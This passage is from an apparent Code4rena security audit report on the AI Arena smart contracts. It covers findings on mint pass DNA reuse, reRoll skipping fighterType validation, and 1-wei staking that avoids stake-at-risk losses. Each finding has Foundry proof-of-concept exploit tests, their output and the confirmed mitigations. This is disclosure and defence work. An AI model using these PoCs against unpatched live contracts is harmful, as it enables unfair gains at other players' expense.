    _fighterFarmContract.redeemMintPass(
    _mintpassIdsToBurn, _fighterTypes, _iconsTypes, _mintPassDNAs, _neuralNetHashes, _modelTypes
    );

    // check balance to see if we successfully redeemed the mintpass for a fighter
    assertEq(_fighterFarmContract.balanceOf(_ownerAddress), 1);
}
```
</details>

```bash
Ran 1 test for test/FighterFarm.t.sol:FighterFarmTest
[PASS] test_redeeming_dendroid_fighters_easily() (gas: 578678)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.56ms

Ran 1 test suite: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

The player can also inspect previous transactions that minted a fighter with rare attributes, copy the provided `mintPassDnas` and provide them as [argument in the `redeemMintPass`](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L237). The `_createNewFighter` function [calls `AiArenaHelper`](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L510) to create the physical attributes for the fighter. The probability of attributes is [deterministic](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/AiArenaHelper.sol#L107-L109) and since the player provided `dna` that already led to a fighter with rare attributes, his fighter will also have rare attributes.

### Recommended Mitigation Steps

The main issue is that the mint pass token is not tied to the fighter properties that the player should claim and the player has complete freedom of the inputs. Consider implementing a signature mechanism that prevents the player from changing the fighter's properties like implemented in [claimFighters](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L206)

**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/366#issuecomment-2018112817)**

**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**
> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/10

**Status:** Mitigation confirmed. Full details in reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/21) and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/3).



***

## [[H-04] Since you can reroll with a different fighterType than the NFT you own, you can reroll bypassing maxRerollsAllowed and reroll attributes based on a different fighterType](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/306)
*Submitted by [klau5](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/306), also found by [McToady](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2046), Tychai0s ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2043), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/879)), [vnavascues](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2015), [d3e4](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1995), [shaka](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1895), [alexxander](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1841), [grearlake](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1818), [AlexCzm](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1767), [lanrebayode77](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1716), [evmboi32](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1711), [givn](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1659), [juancito](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1637), [VAD37](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1609), [Varun\_05](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1543), [DanielArmstrong](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1526), [linmiaomiao](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1524), [14si2o\_Flint](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1483), [Ryonen](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1458), [n0kto](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1410), [alexzoid](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1296), [ktg](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1293), [denzi\_](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1277), [Aymen0909](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1256), [Davide](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1247), [soliditywala](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1228), [Aamir](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1211), [sashik\_eth](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1207), [sl1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1169), [nuthan2x](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1163), [0xAsen](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1121), [merlinboii](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1093), [ke1caM](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1039), [Draiakoo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1011), [petro\_1912](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/972), [MrPotatoMagic](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/957), [PoeAudits](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/942), [0xCiphky](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/924), [aslanbek](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/845), [0xvj](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/793), cats ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/757), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/734)), [yotov721](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/752), [btk](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/677), [pynschon](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/645), [solmaxis69](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/544), [fnanni](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/528), [0xAlix2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/524), [0xKowalski](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/496), [blutorque](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/423), [t0x1c](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/413), [ubl4nk](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/405), [BARW](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/377), [radin100](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/371), [Giorgio](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/370), [zhaojohnson](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/360), [0xlemon](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/305), [jesjupyter](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/302), [SpicyMeatball](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/212), [novamanbg](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/194), [xchen1130](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/167), [matejdb](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/76), [haxatron](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/65), [0xAleko](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/17), [Blank\_Space](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2042), and [Silvermist](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2041)*

Can reroll attributes based on a different fighterType, and can bypass maxRerollsAllowed.

### Proof of Concept

`maxRerollsAllowed` can be set differently depending on the `fighterType`. Precisely, it increases as the generation of fighterType increases.

```solidity
function incrementGeneration(uint8 fighterType) external returns (uint8) {
    require(msg.sender == _ownerAddress);
@>  generation[fighterType] += 1;
@>  maxRerollsAllowed[fighterType] += 1;
    return generation[fighterType];
}
```

The `reRoll` function does not verify if the `fighterType` given as a parameter is actually the `fighterType` of the given tokenId. Therefore, it can use either 0 or 1 regardless of the actual type of the NFT.

This allows bypassing `maxRerollsAllowed` for additional reRoll, and to call `_createFighterBase` and `createPhysicalAttributes` based on a different `fighterType` than the actual NFT's `fighterType`, resulting in attributes calculated based on different criteria.

```solidity
function reRoll(uint8 tokenId, uint8 fighterType) public {
    require(msg.sender == ownerOf(tokenId));
@>  require(numRerolls[tokenId] < maxRerollsAllowed[fighterType]);
    require(_neuronInstance.balanceOf(msg.sender) >= rerollCost, "Not enough NRN for reroll");

    _neuronInstance.approveSpender(msg.sender, rerollCost);
    bool success = _neuronInstance.transferFrom(msg.sender, treasuryAddress, rerollCost);
    if (success) {
        numRerolls[tokenId] += 1;
        uint256 dna = uint256(keccak256(abi.encode(msg.sender, tokenId, numRerolls[tokenId])));
@>      (uint256 element, uint256 weight, uint256 newDna) = _createFighterBase(dna, fighterType);
        fighters[tokenId].element = element;
        fighters[tokenId].weight = weight;
        fighters[tokenId].physicalAttributes = _aiArenaHelperInstance.createPhysicalAttributes(
            newDna,
@>          generation[fighterType],
            fighters[tokenId].iconsType,
            fighters[tokenId].dendroidBool
        );
        _tokenURIs[tokenId] = "";
    }
}
```

PoC:

1.  First, there is a bug that there is no way to set `numElements`, so add a numElements setter to FighterFarm. This bug has been submitted as a separate report.

    ```solidity
    function numElementsSetterForPoC(uint8 _generation, uint8 _newElementNum) public {
        require(msg.sender == _ownerAddress);
        require(_newElementNum > 0);
        numElements[_generation] = _newElementNum;
    }
    ```

2.  Add a test to the FighterFarm.t.sol file and run it. The generation of Dendroid has increased, and `maxRerollsAllowed` has increased. The user who owns the Champion NFT bypassed `maxRerollsAllowed` by putting the `fighterType` of Dendroid as a parameter in the `reRoll` function.

    ```solidity
    function testPoCRerollBypassMaxRerollsAllowed() public {
        _mintFromMergingPool(_ownerAddress);
        // get 4k neuron from treasury
        _fundUserWith4kNeuronByTreasury(_ownerAddress);
        // after successfully minting a fighter, update the model
        if (_fighterFarmContract.ownerOf(0) == _ownerAddress) {
            uint8 maxRerolls = _fighterFarmContract.maxRerollsAllowed(0);
            uint8 exceededLimit = maxRerolls + 1;
            uint8 tokenId = 0;
            uint8 fighterType = 0;

            // The Dendroid's generation changed, and maxRerollsAllowed for Dendroid is increased
            uint8 fighterType_Dendroid = 1;

            _fighterFarmContract.incrementGeneration(fighterType_Dendroid);

            assertEq(_fighterFarmContract.maxRerollsAllowed(fighterType_Dendroid), maxRerolls + 1);
            assertEq(_fighterFarmContract.maxRerollsAllowed(fighterType), maxRerolls); // Champions maxRerollsAllowed is not changed

            _neuronContract.addSpender(address(_fighterFarmContract));

            _fighterFarmContract.numElementsSetterForPoC(1, 3); // this is added function for poc

            for (uint8 i = 0; i < exceededLimit; i++) {
                if (i == (maxRerolls)) {
                    // reRoll with different fighterType
                    assertEq(_fighterFarmContract.numRerolls(tokenId), maxRerolls);
                    _fighterFarmContract.reRoll(tokenId, fighterType_Dendroid);
                    assertEq(_fighterFarmContract.numRerolls(tokenId), exceededLimit);
                } else {
                    _fighterFarmContract.reRoll(tokenId, fighterType);
                }
            }
        }
    }
    ```

### Recommended Mitigation Steps

Check `fighterType` at reRoll function.

```diff
function reRoll(uint8 tokenId, uint8 fighterType) public {
    require(msg.sender == ownerOf(tokenId));
    require(numRerolls[tokenId] < maxRerollsAllowed[fighterType]);
    require(_neuronInstance.balanceOf(msg.sender) >= rerollCost, "Not enough NRN for reroll");
+   require((fighterType == 1 && fighters[tokenId].dendroidBool) || (fighterType == 0 && !fighters[tokenId].dendroidBool), "Wrong fighterType");

    _neuronInstance.approveSpender(msg.sender, rerollCost);
    bool success = _neuronInstance.transferFrom(msg.sender, treasuryAddress, rerollCost);
    if (success) {
        numRerolls[tokenId] += 1;
        uint256 dna = uint256(keccak256(abi.encode(msg.sender, tokenId, numRerolls[tokenId])));
        (uint256 element, uint256 weight, uint256 newDna) = _createFighterBase(dna, fighterType);
        fighters[tokenId].element = element;
        fighters[tokenId].weight = weight;
        fighters[tokenId].physicalAttributes = _aiArenaHelperInstance.createPhysicalAttributes(
            newDna,
            generation[fighterType],
            fighters[tokenId].iconsType,
            fighters[tokenId].dendroidBool
        );
        _tokenURIs[tokenId] = "";
    }
}
```

**[raymondfam (lookout) commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/306#issuecomment-1958470461):**
 > This report covers three consequences from the same root cause of fighter type validation: 1. more re-rolls, 2. rarer attribute switch, 3. generation attribute switch, with coded POC.

**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/306#issuecomment-1975486304)**

**[hickuphh3 (judge) increased severity to High and commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/306#issuecomment-1977947164):**
 > Note: [issue 212](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/212)'s fix is a little more elegant.

**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**
> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/17

**Status:** Mitigation confirmed. Full details in reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/22), [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/44), and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/25).



***

## [[H-05] Malicious user can stake an amount which causes zero curStakeAtRisk on a loss but equal rewardPoints to a fair user on a win](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/116)
*Submitted by [t0x1c](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/116), also found by [Aamir](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2078), peanuts ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2073), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1197)), [YouCrossTheLineAlfie](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2019), [ubermensch](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2009), [d3e4](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1969), [shaka](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1913), [alexxander](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1900), [CodeWasp](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1833), [0xDetermination](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1783), [evmboi32](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1776), [Honour](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1769), [DarkTower](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1735), [ni8mare](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1691), [Blank\_Space](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1673), McToady ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1649), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/955)), [neocrao](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1612), [PedroZurdo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1610), [ZanyBonzy](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1601), [VAD37](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1583), [DanielArmstrong](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1527), 14si2o\_Flint ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1492), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1486)), [forkforkdog](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1445), [MidgarAudits](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1421), [n0kto](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1413), [Krace](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1398), [MrPotatoMagic](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1371), [0xAadi](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1350), [0xBinChook](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1305), [immeas](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1260), btk ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1242), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1075)), [forgebyola](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1181), [aslanbek](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1085), Draiakoo ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1006), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1005)), [petro\_1912](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1002), [ktg](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/986), [israeladelaja](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/954), [0xCiphky](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/918), [Merulez99](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/911), [swizz](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/842), [0rpse](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/717), [Silvermist](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/701), ubl4nk ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/655), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/651)), [dimulski](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/646), erosjohn ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/608), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/601)), [fnanni](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/603), [yotov721](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/596), [Abdessamed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/506), [djxploit](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/304), csanuragjain ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/183), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/168)), [Kalogerone](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/182), [shaflow2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/111), [WoolCentaur](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/38), [Tychai0s](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1206), [handsomegiraffe](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/660), [AC000123](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/247), VrONTg ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1065), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1063), [3](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1061)), [okolicodes](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1062), [Velislav4o](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/750), and [juancito](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2079)*

The [\_getStakingFactor()](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L530-L532) function rounds-up the `stakingFactor_` to one if its zero. Additionally, the [\_addResultPoints()](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L439) function rounds-down the `curStakeAtRisk`.<br>
Whenever a player loses and has no accumulated reward points, 0.1% of his staked amount is considered "at risk" and transferred to the `_stakeAtRiskAddress`. However due to the above calculation styles, he can stake just `1 wei` of NRN to have zero `curStakeAtRisk` in case of a loss and in case of a win, still gain the same amount of reward points as a player staking `4e18-1` wei of NRN. <br>

Let's look at three cases of a player with ELO as 1500:

| Case |      Staked NRN      | stakingFactor calculated by the protocol | Reward Points accumulated in case of a WIN | NRNs lost (stake at risk) in case of a LOSS |
| :--: | :------------------: | :--------------------------------------: | :----------------------------------------: | :-----------------------------------------: |
|   1  |           4          |                     2                    |                    1500                    |                    0.004                    |
|   2  | 3.999999999999999999 |                     1                    |                     750                    |             0.003999999999999999            |
|   3  | 0.000000000000000001 |                     1                    |                     750                    |                      0                      |

As can be seen in Case2 vs Case3, a player staking `0.000000000000000001 NRN` (1 wei) has the same upside in case of a win as a player staking `3.999999999999999999 NRN` (4e18-1 wei) while their downside is `0`.

### Proof of Concept

Add the following test inside `test/RankedBattle.t.sol` and run via `forge test -vv --mt test_t0x1c_UpdateBattleRecord_SmallStake` to see the ouput under the 3 different cases:

<details>

```js
    function test_t0x1c_UpdateBattleRecord_SmallStake() public {
        address player = vm.addr(3);
        _mintFromMergingPool(player);
        uint8 tokenId = 0;
        _fundUserWith4kNeuronByTreasury(player);
        
        // snapshot the current state
        uint256 snapshot0 = vm.snapshot();

        vm.prank(player);
        _rankedBattleContract.stakeNRN(4e18, 0);

        console.log("\n\n==================================== CASE 1 ==========================================================");
        emit log_named_decimal_uint("Stats when staked amount =", 4e18, 18);

        // snapshot the current state
        uint256 snapshot0_1 = vm.snapshot();

        vm.prank(address(_GAME_SERVER_ADDRESS));
        _rankedBattleContract.updateBattleRecord(0, 50, 0, 1500, true); // if player had won
        (uint256 wins,,) = _rankedBattleContract.fighterBattleRecord(tokenId);
        assertEq(wins, 1);
        

        console.log("\n----------------------------------  IF WON  ---------------------------------------------------");
        console.log("accumulatedPointsPerFighter =:", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));
        emit log_named_decimal_uint("getStakeAtRisk =", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);
        emit log_named_decimal_uint("_rankedBattleContract NRN balance =", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);
        emit log_named_decimal_uint("_stakeAtRiskContract NRN balance =", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);

        // Restore to snapshot state
        vm.revertTo(snapshot0_1);

        vm.prank(address(_GAME_SERVER_ADDRESS));
        _rankedBattleContract.updateBattleRecord(0, 50, 2, 1500, true); // if player had lost
        (,, uint256 losses) = _rankedBattleContract.fighterBattleRecord(tokenId);
        assertEq(losses, 1);

        console.log("\n----------------------------------  IF LOST  ---------------------------------------------------");
        console.log("accumulatedPointsPerFighter =", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));
        emit log_named_decimal_uint("getStakeAtRisk =", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);
        emit log_named_decimal_uint("_rankedBattleContract NRN balance =", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);
        emit log_named_decimal_uint("_stakeAtRiskContract NRN balance =", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);


        // Restore to snapshot state
        vm.revertTo(snapshot0);

        vm.prank(player);
        _rankedBattleContract.stakeNRN(4e18-1, 0);

        console.log("\n\n==================================== CASE 2 ==========================================================");
        emit log_named_decimal_uint("Stats when staked amount =", 4e18-1, 18);

        // snapshot the current state
        uint256 snapshot1_1 = vm.snapshot();

        vm.prank(address(_GAME_SERVER_ADDRESS));
        _rankedBattleContract.updateBattleRecord(0, 50, 0, 1500, true); // if player had won
        (wins,,) = _rankedBattleContract.fighterBattleRecord(tokenId);
        assertEq(wins, 1);
        

        console.log("\n----------------------------------  IF WON  ---------------------------------------------------");
        console.log("accumulatedPointsPerFighter =:", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));
        emit log_named_decimal_uint("getStakeAtRisk =", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);
        emit log_named_decimal_uint("_rankedBattleContract NRN balance =", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);
        emit log_named_decimal_uint("_stakeAtRiskContract NRN balance =", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);

        // Restore to snapshot state
        vm.revertTo(snapshot1_1);

        vm.prank(address(_GAME_SERVER_ADDRESS));
        _rankedBattleContract.updateBattleRecord(0, 50, 2, 1500, true); // if player had lost
        (,, losses) = _rankedBattleContract.fighterBattleRecord(tokenId);
        assertEq(losses, 1);

        console.log("\n----------------------------------  IF LOST  ---------------------------------------------------");
        console.log("accumulatedPointsPerFighter =", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));
        emit log_named_decimal_uint("getStakeAtRisk =", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);
        emit log_named_decimal_uint("_rankedBattleContract NRN balance =", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);
        emit log_named_decimal_uint("_stakeAtRiskContract NRN balance =", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);


        // Restore to snapshot state
        vm.revertTo(snapshot0);

        vm.prank(player);
        _rankedBattleContract.stakeNRN(1, 0);

        console.log("\n\n==================================== CASE 3 ==========================================================");
        emit log_named_decimal_uint("Stats when staked amount =", 1, 18);

        // snapshot the current state
        uint256 snapshot2_1 = vm.snapshot();

        vm.prank(address(_GAME_SERVER_ADDRESS));
        _rankedBattleContract.updateBattleRecord(0, 50, 0, 1500, true); // if player had won
        (wins,,) = _rankedBattleContract.fighterBattleRecord(tokenId);
        assertEq(wins, 1);
        

        console.log("\n----------------------------------  IF WON  ---------------------------------------------------");
        console.log("accumulatedPointsPerFighter =:", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));
        emit log_named_decimal_uint("getStakeAtRisk =", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);
        emit log_named_decimal_uint("_rankedBattleContract NRN balance =", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);
        emit log_named_decimal_uint("_stakeAtRiskContract NRN balance =", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);

        // Restore to snapshot state
        vm.revertTo(snapshot2_1);

        vm.prank(address(_GAME_SERVER_ADDRESS));
        _rankedBattleContract.updateBattleRecord(0, 50, 2, 1500, true); // if player had lost
        (,, losses) = _rankedBattleContract.fighterBattleRecord(tokenId);
        assertEq(losses, 1);

        console.log("\n----------------------------------  IF LOST  ---------------------------------------------------");
        console.log("accumulatedPointsPerFighter =", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));
        emit log_named_decimal_uint("getStakeAtRisk =", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);
        emit log_named_decimal_uint("_rankedBattleContract NRN balance =", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);
        emit log_named_decimal_uint("_stakeAtRiskContract NRN balance =", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);
    }
```
</details>

Output:

<details>

```text
==================================== CASE 1 ==========================================================
  Stats when staked amount =: 4.000000000000000000

----------------------------------  IF WON  ---------------------------------------------------
  accumulatedPointsPerFighter =: 1500
  getStakeAtRisk =: 0.000000000000000000
  _rankedBattleContract NRN balance =: 4.000000000000000000
  _stakeAtRiskContract NRN balance =: 0.000000000000000000

----------------------------------  IF LOST  ---------------------------------------------------
  accumulatedPointsPerFighter = 0
  getStakeAtRisk =: 0.004000000000000000
  _rankedBattleContract NRN balance =: 3.996000000000000000
  _stakeAtRiskContract NRN balance =: 0.004000000000000000


==================================== CASE 2 ==========================================================
  Stats when staked amount =: 3.999999999999999999

----------------------------------  IF WON  ---------------------------------------------------
  accumulatedPointsPerFighter =: 750
  getStakeAtRisk =: 0.000000000000000000
  _rankedBattleContract NRN balance =: 3.999999999999999999
  _stakeAtRiskContract NRN balance =: 0.000000000000000000

----------------------------------  IF LOST  ---------------------------------------------------
  accumulatedPointsPerFighter = 0
  getStakeAtRisk =: 0.003999999999999999
  _rankedBattleContract NRN balance =: 3.996000000000000000
  _stakeAtRiskContract NRN balance =: 0.003999999999999999


==================================== CASE 3 ==========================================================
  Stats when staked amount =: 0.000000000000000001

----------------------------------  IF WON  ---------------------------------------------------
  accumulatedPointsPerFighter =: 750
  getStakeAtRisk =: 0.000000000000000000
  _rankedBattleContract NRN balance =: 0.000000000000000001
  _stakeAtRiskContract NRN balance =: 0.000000000000000000

----------------------------------  IF LOST  ---------------------------------------------------
  accumulatedPointsPerFighter = 0
  getStakeAtRisk =: 0.000000000000000000
  _rankedBattleContract NRN balance =: 0.000000000000000001
  _stakeAtRiskContract NRN balance =: 0.000000000000000000
```
</details>

### Tools used

Foundry

### Recommended Mitigation Steps

Protocol can choose to set a minimum stake amount of `4 NRN` *(4e18 wei)*. One needs to take care that even after a partial unstake, this amount is not allowed to go below `4 NRN`. <br>
Also, do not round up `stakingFactor_` i.e. remove [L530-L532](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L530-L532). An additional check can be added too which ensures that `stakingFactor_` is greater than zero:

```diff
  File: src/RankedBattle.sol

  519:              function _getStakingFactor(
  520:                  uint256 tokenId, 
  521:                  uint256 stakeAtRisk
  522:              ) 
  523:                  private 
  524:                  view 
  525:                  returns (uint256) 
  526:              {
  527:                uint256 stakingFactor_ = FixedPointMathLib.sqrt(
  528:                    (amountStaked[tokenId] + stakeAtRisk) / 10**18
  529:                );
- 530:                if (stakingFactor_ == 0) {
- 531:                  stakingFactor_ = 1;
- 532:                }
+ 532:                require(stakingFactor_ > 0, "stakingFactor_ = 0");
  533:                return stakingFactor_;
  534:              }    
```

The above fixes would ensure that `curStakeAtRisk` can never be gamed to 0 while still having a positive reward potential.<br>
It's may also be a good idea to have a provision to return any "extra" staked amount. For example, if only 4 NRN is required to achieve a stakingFactor of 1 and the player stakes 4.5 NRN, then the extra 0.5 NRN could be returned. This however is up to the protocol to consider.

**[raymondfam (lookout) commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/116#issuecomment-1959673959):**
 > Strategic dodging to avoid penalty. Might as well fully unstake to make curStakeAtRisk 0. However, points would be zero if at risk penalty were to kick in.

**[hickuphh3 (judge) increased severity to High](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/116#issuecomment-1982247090)**



***

## [[H-06] `FighterFarm::reRoll` won't work for nft id greater than 255 due to input limited to uint8](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/68)
